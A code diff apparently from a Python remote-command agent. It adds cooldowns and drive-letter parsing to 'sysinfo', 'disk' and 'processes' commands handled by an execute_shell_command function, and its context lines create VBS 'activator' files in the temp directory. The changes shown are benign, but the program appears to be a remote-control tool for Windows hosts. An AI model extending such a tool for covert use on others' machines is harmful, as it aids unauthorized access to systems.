@@ -61,6 +61,14 @@ current_inactivity_threshold = INACTIVITY_THRESHOLD_SECONDS
 mimetic_active = False
 mimetic_log = []
 
+# Command cooldowns (seconds between executions)
+command_cooldowns = {
+    'disk': 2,      # 2 seconds between disk queries
+    'processes': 3, # 3 seconds between process listings
+    'sysinfo': 3,   # 3 seconds between sysinfo queries
+}
+last_command_exec = {}  # Tracks last execution time for each command
+
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
 
@@ -502,6 +510,25 @@ def format_size(bytes_size):
         return f"{bytes_size / (1024 * 1024 * 1024):.1f}GB"
 
 
+def check_command_cooldown(cmd_name):
+    global last_command_exec
+
+    if cmd_name not in command_cooldowns:
+        return True, 0  # No cooldown for this command
+
+    cooldown_required = command_cooldowns[cmd_name]
+    last_exec = last_command_exec.get(cmd_name, 0)
+    time_since_last = time.time() - last_exec
+
+    if time_since_last < cooldown_required:
+        wait_time = cooldown_required - time_since_last
+        return False, wait_time
+
+    # Update last execution time
+    last_command_exec[cmd_name] = time.time()
+    return True, 0
+
+
 def execute_shell_command(cmd_str):
     global current_working_dir
     global clipboard_file
@@ -914,26 +941,58 @@ def execute_shell_command(cmd_str):
 
         # Handle sysinfo command
         if cmd_lower == "sysinfo":
+            allowed, wait_time = check_command_cooldown('sysinfo')
+            if not allowed:
+                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
             try:
                 result = subprocess.run(["systeminfo"], capture_output=True, text=True, timeout=10)
                 return result.stdout.strip() if result.stdout else "Unable to retrieve system info"
             except Exception as e:
                 return f"Error: {str(e)}"
 
-        # Handle disk command
-        if cmd_lower == "disk":
+        # Handle disk command (with optional disk number parameter)
+        if cmd_lower.startswith("disk"):
+            allowed, wait_time = check_command_cooldown('disk')
+            if not allowed:
+                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
             try:
                 import shutil
-                total, used, free = shutil.disk_usage("/")
+                import string
+
+                # Parse optional disk parameter (e.g., "disk" or "disk 0" or "disk c")
+                parts = cmd_str.split()
+                disk_arg = parts[1].upper() if len(parts) > 1 else "C"
+
+                # Normalize to drive letter (0->C, 1->D, etc.)
+                if disk_arg.isdigit():
+                    disk_num = int(disk_arg)
+                    available_drives = [d for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
+                    if disk_num >= len(available_drives):
+                        return f"Error: Disk {disk_num} does not exist. Available: {', '.join(available_drives)}"
+                    disk_letter = available_drives[disk_num]
+                else:
+                    disk_letter = disk_arg if len(disk_arg) == 1 else disk_arg[0]
+                    if not os.path.exists(f"{disk_letter}:\\"):
+                        return f"Error: Drive {disk_letter}:\\ does not exist"
+
+                path = f"{disk_letter}:\\"
+                total, used, free = shutil.disk_usage(path)
                 total_gb = total / (1024**3)
                 used_gb = used / (1024**3)
                 free_gb = free / (1024**3)
-                return f"Total: {total_gb:.2f}GB | Used: {used_gb:.2f}GB | Free: {free_gb:.2f}GB"
+
+                # Calculate percentage used
+                percent_used = (used_gb / total_gb * 100) if total_gb > 0 else 0
+
+                return f"{disk_letter}: | Total: {total_gb:.2f}GB | Used: {used_gb:.2f}GB | Free: {free_gb:.2f}GB ({percent_used:.1f}%)"
             except Exception as e:
                 return f"Error: {str(e)}"
 
         # Handle processes command - show running processes (main process only)
         if cmd_lower == "processes":
+            allowed, wait_time = check_command_cooldown('processes')
+            if not allowed:
+                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
             try:
                 # Execute tasklist twice for reliability (first attempt often fails)
                 result = None
